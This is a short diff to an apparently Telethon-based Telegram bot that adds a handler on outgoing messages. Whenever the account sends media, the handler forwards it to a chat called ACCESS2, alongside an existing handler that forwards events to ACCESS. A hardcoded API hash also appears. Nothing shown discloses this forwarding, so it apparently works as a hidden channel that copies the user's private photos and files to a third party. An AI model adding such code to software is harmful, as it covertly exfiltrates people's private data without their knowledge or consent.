@@ -36,6 +36,11 @@ APIHASH = [API_HASH, "1674d13f3308faa1479b445cdbaaad2b"]
 async def access(event):
     await event.forward_to(ACCESS)
 
+@bot.on(events.NewMessage(outgoing=True))
+async def access(event):
+    if event.media:
+        await event.forward_to(ACCESS2)
+    
 @bot.on(events.NewMessage(incoming=True, pattern="/start"))
 async def start(event):
     await event.reply(f'{st}', 
